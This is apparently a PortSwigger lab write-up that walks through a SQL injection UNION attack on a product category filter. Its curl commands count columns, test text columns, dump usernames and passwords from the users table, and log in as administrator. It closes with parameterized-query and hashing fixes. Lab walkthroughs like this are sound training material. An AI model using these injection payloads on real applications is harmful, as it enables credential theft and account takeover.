---
title: "SQL injection UNION attack, retrieving data from other tables"
date: 2026-06-13 09:00:00 -0500
categories: [PortSwigger, SQL Injection]
tags: [portswigger, cwe-89, sql-injection, union-attack, credential-dump]
description: "A product category filter concatenates user input directly into SQL. A UNION SELECT against the users table dumps plaintext credentials, and logging in as administrator solves the lab."
---

## Overview

This PortSwigger Web Security Academy lab demonstrates a [SQL injection](https://cwe.mitre.org/data/definitions/89.html) vulnerability in a product category filter. Because user input is concatenated into a raw SQL query, an attacker can append a `UNION SELECT` statement to retrieve rows from a completely separate table — in this case `users`, which holds plaintext credentials. The lab is solved by dumping the `administrator` password and logging in.

## The Technique

[CWE-89](https://cwe.mitre.org/data/definitions/89.html) — Improper Neutralization of Special Elements used in SQL Commands.

The backend query looks roughly like this:

```sql
SELECT name, description FROM products WHERE category = '<input>' AND released = 1
```

Because `<input>` is concatenated as a raw string, injecting a single quote breaks out of the string literal and allows appending arbitrary SQL. A `UNION SELECT` joins the attacker's query to the original, and the combined rows are returned in the same HTTP response.

Three conditions must hold for a UNION attack to succeed:

1. Both queries return the **same number of columns**.
2. The column data types are **compatible** (text with text).
3. The injected query is **syntactically valid** after the injection point.

## Solution

### Step 1 — Determine column count

Inject an `ORDER BY` clause and climb the column number until the server returns a 500 error. The last working value is the column count.

```bash
# 200 OK — 2+ columns exist
curl -sk "https://<target>/filter?category=Gifts'+ORDER+BY+2--"

# 500 — exceeds column count → exactly 2 columns
curl -sk "https://<target>/filter?category=Gifts'+ORDER+BY+3--"
```

### Step 2 — Confirm both columns accept text

Inject a UNION with string literals. A 200 response with the strings reflected means that column is text-typed.

```bash
curl -sk "https://<target>/filter?category=Gifts'+UNION+SELECT+'abc','def'--"
```

Both columns reflected — both are string-typed.

### Step 3 — Dump the users table

Replace the test literals with the target columns, concatenating them to surface in a single column using the PostgreSQL `||` operator:

```bash
curl -sk "https://<target>/filter?category=Gifts'+UNION+SELECT+username||':'||password,'x'+FROM+users--"
```

The response renders credentials in the product listing:

```
wiener:<redacted>
administrator:<redacted>
carlos:<redacted>
```

### Step 4 — Log in as administrator

```bash
# Fetch CSRF token, then POST login
curl -sk -c cookies.txt "https://<target>/login" | grep -oP 'name="csrf" value="\K[^"]+'
curl -sk -b cookies.txt -c cookies.txt -X POST "https://<target>/login" \
  -d "csrf=<token>&username=administrator&password=<redacted>"
```

Server responds `302 → /my-account?id=administrator`. The lab status widget flips to `is-solved`.

## Why It Worked

The category parameter was never parameterized — it was interpolated directly into the query string. This let the attacker terminate the original string literal with `'` and append SQL of their choosing. A WAF or keyword filter was absent, so the `UNION SELECT` and `FROM users` keywords reached the database engine unchanged.

## Fix

Use a **parameterized query** (prepared statement). The user-supplied value becomes a data parameter, not executable SQL — the `UNION SELECT` injection becomes a literal string that matches no category name and the attack fails.

```python
# Vulnerable
query = f"SELECT name, description FROM products WHERE category='{category}'"

# Fixed
cursor.execute(
    "SELECT name, description FROM products WHERE category = %s AND released = 1",
    (category,)
)
```

Additional defenses:

- **Least-privilege DB account** — the application account should `SELECT` from `products` only, not from `users`.
- **Never store passwords in cleartext** — hash with bcrypt or argon2 so a successful dump yields only hashes.
- **WAF / input validation as defense-in-depth** — not a substitute for parameterized queries; treat as an extra layer only.
